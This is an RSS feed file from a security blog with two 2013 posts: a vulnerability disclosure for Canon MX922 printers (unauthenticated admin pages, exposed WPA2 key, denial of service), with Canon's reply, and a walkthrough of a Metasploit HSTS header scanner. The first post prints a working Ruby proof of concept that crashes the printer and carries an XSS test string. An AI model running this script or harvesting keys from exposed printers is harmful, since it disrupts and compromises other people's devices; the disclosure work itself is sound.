@@ -1,0 +1,294 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Http on Matt Andreko</title>
+    <link>https://www.mattandreko.com/categories/http/index.xml</link>
+    <description>Recent content in Http on Matt Andreko</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-US</language>
+    <atom:link href="https://www.mattandreko.com/categories/http/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Canon, Y U NO Security?</title>
+      <link>https://www.mattandreko.com/blog/2013-06-18-canon-y-u-no-security/</link>
+      <pubDate>Tue, 18 Jun 2013 08:23:00 -0400</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2013-06-18-canon-y-u-no-security/</guid>
+      <description>
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/y-u-no-guy.jpg#left&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I recently bought a new printer at home, so my wife could print coupons without manually attaching to my office printer each time (Thanks coupons.com and all the other shady sites that require spyware-like software to print coupons, and often don&amp;rsquo;t support network printers). I ended up picking up a &lt;a href=&#34;https://www.amazon.com/dp/B00AVWKUJS/ref=as_li_ss_til?tag=mattandcom-20&amp;amp;camp=0&amp;amp;creative=0&amp;amp;linkCode=as4&amp;amp;creativeASIN=B00AVWKUJS&amp;amp;adid=07S04SQ3X3C73H5QDS7T&amp;amp;&#34;&gt;Canon MX922&lt;/a&gt;. It works awesome for her, and is connected over WiFi, so any device in the house can print to it. This got me thinking though, about how secure it was.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;h2 id=&#34;no-credentials-for-management-interface&#34;&gt;No Credentials For Management Interface&lt;/h2&gt;
+
+&lt;h3 id=&#34;cve-2013-4613&#34;&gt;CVE-2013-4613&lt;/h3&gt;
+
+&lt;p&gt;I found the IP of the status page of my router, and browsed to it. I was greeted with this management page.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/printer_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I then figured I&amp;rsquo;d look at some of the more advanced settings, so I clicked the &amp;ldquo;Advanced&amp;rdquo; link. This brought me to a control panel for the printer. I saw a bunch of information, and was surprised that I had not entered &lt;b&gt;any&lt;/b&gt; credentials. I figured maybe the status page would be anonymous, but surely I&amp;rsquo;d need some password to access the management pages. But then again, I hadn&amp;rsquo;t used any password when setting up the printer using the LCD.&lt;/p&gt;
+
+&lt;h2 id=&#34;disclosure-of-wireless-key-and-ssid&#34;&gt;Disclosure of Wireless Key and SSID&lt;/h2&gt;
+
+&lt;h3 id=&#34;cve-2013-4614&#34;&gt;CVE-2013-4614&lt;/h3&gt;
+
+&lt;p&gt;I eventually browsed to the &amp;ldquo;Network Settings&amp;rdquo; tab, and saw my SSID of &amp;ldquo;Wireless&amp;rdquo;. Not too bad, since it&amp;rsquo;s broadcast in the air.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/printer_2.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I saw that it was using WPA2, as I configured. I clicked the &amp;ldquo;Modify&amp;rdquo; button, and saw that I could change all of the wireless settings. The worst was that when I saw the &amp;ldquo;Use WPA2&amp;rdquo; radio button, I saw that there was text in the password box.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/printer_3.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Assuming that there was a junk value in there, I viewed the source. Unfortunately, what I found was that the page did indeed have my printer&amp;rsquo;s WPA2 password right there.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/printer_4.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I started thinking about this. It wasn&amp;rsquo;t a &lt;i&gt;huge&lt;/i&gt; issue, since you&amp;rsquo;d have to already know my WPA2 key to get to the printer, right? Oh, but what about if a device behind my firewall had been compromised by a remote attacker? The attacker would be free to navigate to my printer, and grab my password. If I was like just about every other person I talk to, I probably use the same password on everything, so I don&amp;rsquo;t have to remember unique passwords. That means now an attacker could potentially login to my email, my SSH server, or even other machines on my LAN. This scared me slightly.&lt;/p&gt;
+
+&lt;p&gt;After a while, I started thinking that perhaps there were people that could potentially put their printers directly connected to the internet, and have these management interfaces publicly exposed to anonymous clients. I checked out the &lt;a href=&#34;http://www.shodanhq.com/search?q=port%3A80+KS_HTTP+1.0&#34;&gt;ShodanHQ&lt;/a&gt; (FYI, it seems also Minolta uses this server banner as well). I saw that there were nearly 15,000 at the time of this writing, so I wrote up a quick Metasploit module to enumerate the information. It is located &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/canon_wireless.rb&#34;&gt;here&lt;/a&gt;. Below is sample output from a selection of hosts I got from ShodanHQ and a host that should time out, as a control sample.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/printer_5.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;denial-of-service&#34;&gt;Denial of Service&lt;/h2&gt;
+
+&lt;h3 id=&#34;cve-2013-4615&#34;&gt;CVE-2013-4615&lt;/h3&gt;
+
+&lt;p&gt;I kept playing around with the configuration interface, and while tinkering with some inputs in &lt;a href=&#34;http://portswigger.net/burp/&#34;&gt;Burp&lt;/a&gt;, the device stopped responding. I walked to the other room, where we keep the printer, and noticed that it was completely unresponsive. I had to power-cycle the device, to which it came back up and told me it wasn&amp;rsquo;t powered down properly.&lt;/p&gt;
+
+&lt;p&gt;When I reported this to Canon, they asked me for more information, so I provided them the following code as a proof-of-concept.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#!/usr/bin/ruby
+
+require &#39;net/http&#39;
+require &#39;uri&#39;
+
+print &#39;Enter your printer IP Address: &#39;
+input = gets.strip
+
+printer_url = &amp;quot;http://#{input}&amp;quot;
+
+# Make the first request, to set the IP to invalid data
+post = Net::HTTP.post_form(URI.parse(printer_url + &#39;/English/pages_MacUS/cgi_lan.cgi&#39;),
+{&#39;OK.x&#39; =&amp;gt; &#39;61&#39;, &#39;OK.y&#39; =&amp;gt; &#39;12&#39;, &#39;LAN_OPT1&#39; =&amp;gt; &#39;2&#39;, &#39;LAN_TXT1&#39; =&amp;gt; &#39;Wireless&#39;, &#39;LAN_OPT3&#39; =&amp;gt; &#39;1&#39;, &#39;LAN_TXT21&#39; =&amp;gt; &#39;192&#39;, 
+&#39;LAN_TXT22&#39; =&amp;gt; &#39;168&#39;, &#39;LAN_TXT23&#39; =&amp;gt; &#39;1&#39;, &#39;LAN_TXT24&#39; =&amp;gt; &#39;114&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(\&#39;xss\&#39;);&amp;lt;/script&amp;gt;&#39;, &#39;LAN_TXT31&#39; =&amp;gt; &#39;255&#39;,
+&#39;LAN_TXT32&#39; =&amp;gt; &#39;255&#39;, &#39;LAN_TXT33&#39; =&amp;gt; &#39;255&#39;, &#39;LAN_TXT34&#39; =&amp;gt; &#39;0&#39;, &#39;LAN_TXT41&#39; =&amp;gt; &#39;192&#39;, &#39;LAN_TXT42&#39; =&amp;gt; &#39;168&#39;, 
+&#39;LAN_TXT43&#39; =&amp;gt; &#39;1&#39;, &#39;LAN_TXT44&#39; =&amp;gt; &#39;1&#39;, &#39;LAN_OPT2&#39; =&amp;gt; &#39;4&#39;, &#39;LAN_OPT4&#39; =&amp;gt; &#39;1&#39;, &#39;LAN_HID1&#39; =&amp;gt; &#39;1&#39;})
+
+# Make the second request, to trigger the DoS
+begin
+get = Net::HTTP.get(URI.parse(printer_url + &#39;/English/pages_MacUS/lan_set_content.html&#39;))
+rescue Timeout::Error
+puts &#39;Look at your printer to see it is unresponsive.&#39;
+end
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If you look closely, you can see that I was testing for Cross-Site-Scripting, and put HTML in the &amp;ldquo;LAN_TXT24&amp;rdquo; input box. Canon&amp;rsquo;s javascript validation prevents this, but nothing stops you from manipulating the HTTP response. This is a prime example of why server-side validation is also required.&lt;/p&gt;
+
+&lt;p&gt;I ended up turning this into a Metasploit module as well. You can find it available &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/dos/http/canon_wireless_printer.rb&#34;&gt;here&lt;/a&gt;. It works pretty similarly to most DoS modules:&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/printer_6.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;canon-s-response&#34;&gt;Canon&amp;rsquo;s Response&lt;/h2&gt;
+
+&lt;p&gt;I responsibly disclosed these vulnerabilities to Canon, but they apparently don&amp;rsquo;t deem them worthy of being fixed. I don&amp;rsquo;t think they really &amp;ldquo;get it&amp;rdquo;. Since they aren&amp;rsquo;t going to fix it, I am releasing these details publicly. Below is their reply:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Dear Mr. Andreko,&lt;/p&gt;
+
+&lt;p&gt;Thank you for your patience in allowing Canon to respond.  We have confirmed that the two issues you described in your May 27th e-mail can occur in certain printers such as the MX922.  However, with respect to the issue of no password by default, please note that the inkjet printers which have network functionality such as the MX922 are designed for home use which is supposed to be secured.  For this reason, and for user convenience, the default setting does not require a password.  However, if a user has a particular concern about third parties accessing the user’s home printer, the default setting can be changed to add a password.&lt;/p&gt;
+
+&lt;p&gt;Similarly, regarding the DoS issue, Canon believes that its printers will not have to deal with unauthorized access to the network from an external location as long as the printers are used in a secured environment.  The issue you described could only occur when unauthorized access to an unsecured network takes place from the outside.  Canon has long advised customers to ensure that their computers and printers are secured when used in a wireless LAN environment.  We will continue advising customers to use our inkjet printers in a secured network environment with a firewall.  However, even if the printer were not used in a secure environment, in the unlikely chance that this type of access occurred from outside, the printer would simply have to be unplugged and re-plugged to ensure normal operation.  In addition, if the network security settings on the printer had been changed by the external source as a result of the incident, then they would have to be changed back to the default settings along with unplugging and re-plugging the power cord to ensure normal operation.&lt;/p&gt;
+
+&lt;p&gt;Again, we thank you for giving Canon the opportunity to investigate these issues and to respond to your concerns.&lt;/p&gt;
+
+&lt;p&gt;Best regards,
+Joy
+Executive Response Representative
+Canon Customer Relations
+customer@cits.canon.com
+866-886-1901, x 2130&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I understand, these vulnerabilites aren&amp;rsquo;t super high priority. They&amp;rsquo;re no ms08-067. But I would still think a vendor would want to fix them. When searching ShodanHQ, I found a bunch of printers from UCLA. I can only imagine the chaos when it becomes finals-week, and all the printers on campus stop working randomly. That&amp;rsquo;d be bad PR for Canon. Who knows what else is out there. I&amp;rsquo;d personally be interested in dumping the firmware of the printer, and seeing if there&amp;rsquo;s a way to get remote code execution out of a crash. I&amp;rsquo;ll chalk that up to my TODO list.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>HSTS Metasploit Module</title>
+      <link>https://www.mattandreko.com/blog/2013-02-21-hsts-metasploit-module/</link>
+      <pubDate>Thu, 21 Feb 2013 13:20:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2013-02-21-hsts-metasploit-module/</guid>
+      <description>
+
+&lt;p&gt;I have been working as a security consultant for a few months now, and one finding that is on almost every webserver I come across, is the lack of an &lt;a href=&#34;https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security&#34;&gt;HSTS (HTTP Strict Transport Security)&lt;/a&gt; implementation. This is understandable, since HSTS is still fairly new. In fact, before starting at &lt;a href=&#34;http://www.accuvant.com&#34;&gt;Accuvant&lt;/a&gt;, I had never heard of it either! However, since most browsers support it now, I wanted to be able to report on it. As of the time of this post, &lt;a href=&#34;https://www.rapid7.com/products/nexpose&#34;&gt;Nexpose&lt;/a&gt; does not have a finding for this item, but I believe &lt;a href=&#34;http://www.tenable.com/products/nessus&#34;&gt;Nessus&lt;/a&gt; does. To report on this finding, and provide a screenshot evidence to customers, we were often resorting to manually looking at the headers, or implementing home-made scripts to do it.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;h2 id=&#34;wait-hsts-what-are-you-talking-about&#34;&gt;Wait, HSTS? What are you talking about?&lt;/h2&gt;
+
+&lt;p&gt;When you visit a website over unsecured HTTP, it&amp;rsquo;s often considered a best practice to do a 302 redirect to the HTTPS site. That way, when browser users just type in the domain, it gets redirected to the secure site. When the &amp;ldquo;Strict-Transport-Security&amp;rdquo; header is added to the HTTPS response, the client then knows for a certain amount of time (based on the header&amp;rsquo;s value) to ONLY request the HTTPS version of the site. This can greatly reduce the chances of phishing.&lt;/p&gt;
+
+&lt;p&gt;One convenient thing that will occur with HSTS, is that even if you make requests to the HTTP version of the site, the browser will actually bypass that, and request straight from the HTTPS site. This prevents leaks that often occur with images, stylesheets, and scripts.&lt;/p&gt;
+
+&lt;h2 id=&#34;get-to-the-module-already&#34;&gt;Get to the module already!&lt;/h2&gt;
+
+&lt;p&gt;The crew over on the &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt; team were really quick adding this module, which isn&amp;rsquo;t surprising since it was super easy to implement. I was honestly surprised that nobody had done it already. The code can be found &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/http_hsts.rb&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&#34;so-how-do-i-use-this-thing&#34;&gt;So how do I use this thing?&lt;/h2&gt;
+
+&lt;p&gt;The usage is pretty simple. First, load up Metasploit and gaze at the ASCII-art:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;420-1572-man:~ mandreko$ msfconsole
+
+ ______________________________________________________________________________
+|                                                                              |
+|                   METASPLOIT CYBER MISSILE COMMAND V4                        |
+|______________________________________________________________________________|
+      \                                  /                      /
+       \     .                          /                      /            x
+        \                              /                      /
+         \                            /          +           /
+          \            +             /                      /
+           *                        /                      /
+                                   /      .               /
+    X                             /                      /            X
+                                 /                     ###
+                                /                     # % #
+                               /                       ###
+                      .       /
+     .                       /      .            *           .
+                            /
+                           *
+                  +                       *
+
+                                       ^
+####      __     __     __          #######         __     __     __        ####
+####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
+################################################################################
+################################################################################
+# WAVE 4 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
+################################################################################
+                                                           http://metasploit.pro
+
+
+       =[ metasploit v4.6.0-dev [core:4.6 api:1.0]
++ -- --=[ 1048 exploits - 589 auxiliary - 174 post
++ -- --=[ 275 payloads - 28 encoders - 8 nops
+
+msf &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next, just load up the HSTS Scanner module and look at the options:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/http/http_hsts 
+msf  auxiliary(http_hsts) &amp;gt; show options
+
+Module options (auxiliary/scanner/http/http_hsts):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   Proxies                   no        Use a proxy chain
+   RHOSTS                    yes       The target address range or CIDR identifier
+   RPORT    443              yes       The target port
+   SSL      true             yes       Negotiate SSL for outgoing connections
+   THREADS  1                yes       The number of concurrent threads
+   VHOST                     no        HTTP server virtual host
+
+msf  auxiliary(http_hsts) &amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Add the hosts that you want to scan, by setting the &amp;ldquo;RHOSTS&amp;rdquo; variable:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf  auxiliary(http_hsts) &amp;gt; set rhosts www.paypal.com, www.google.com, www.yahoo.com, www.wikipedia.org
+rhosts =&amp;gt; www.paypal.com, www.google.com, www.yahoo.com, www.wikipedia.org
+msf  auxiliary(http_hsts) &amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once you&amp;rsquo;re ready, just run the module:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf  auxiliary(http_hsts) &amp;gt; run
+
+[+] 23.65.2.234:443 - Strict-Transport-Security:max-age=14400, max-age=14400
+[-] 74.125.131.99:443 No HSTS found.
+[*] Scanned 02 of 18 hosts (011% complete)
+[-] 74.125.131.104:443 No HSTS found.
+[-] 74.125.131.106:443 No HSTS found.
+[*] Scanned 04 of 18 hosts (022% complete)
+[-] 74.125.131.147:443 No HSTS found.
+[-] 74.125.131.105:443 No HSTS found.
+[*] Scanned 06 of 18 hosts (033% complete)
+[-] 74.125.131.103:443 No HSTS found.
+[*] Scanned 08 of 18 hosts (044% complete)
+[-] 98.139.183.24:443 No HSTS found.
+[*] Scanned 09 of 18 hosts (050% complete)
+[*] Scanned 11 of 18 hosts (061% complete)
+[*] Scanned 13 of 18 hosts (072% complete)
+[*] Scanned 15 of 18 hosts (083% complete)
+[-] 208.80.154.225:443 No HSTS found.
+[*] Scanned 17 of 18 hosts (094% complete)
+[*] Scanned 18 of 18 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf  auxiliary(http_hsts) &amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You can see that out of all of those hosts, paypal.com (23.65.2.234) was the only one that implemented the HSTS header.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
